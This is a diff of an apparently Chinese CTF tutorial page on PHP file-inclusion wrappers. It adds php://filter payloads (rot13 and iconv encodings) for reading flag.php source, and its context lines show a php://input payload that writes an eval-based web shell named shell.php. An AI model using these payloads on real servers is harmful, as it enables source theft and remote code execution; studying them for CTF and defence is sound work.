@@ -165,6 +165,10 @@
 <h3 id="2-php"><a href="#2-php" class="headerlink" title="2.php:&#x2F;&#x2F;"></a>2.php:&#x2F;&#x2F;</h3><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码。<br>php:&#x2F;&#x2F;input用于执行php代码。</p>
 <p><strong>php:&#x2F;&#x2F;filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
 <p><em>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;文件路径</em>	读取源代码！可以不加read&#x3D;</p>
+<p>还可以使用rot编码index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;flag.php</p>
+<p>或者<code>?file=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</code></p>
+<p><code>　使用方法：convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 或者 convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code></p>
+<p>查看<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">php支持的编码</a></p>
 <p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。前提:allow_url_include：on</p>
 <p>利用该方法，我们可以直接写入php文件，输入<code>file=php://input</code>，然后使用burp抓包，post写入php代码：<code>&lt;?php fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#39;&lt;?php eval($_POST[123]);?&gt;&#39;);?&gt;</code></p>
 <p>生成名为shell.php的木马</p>
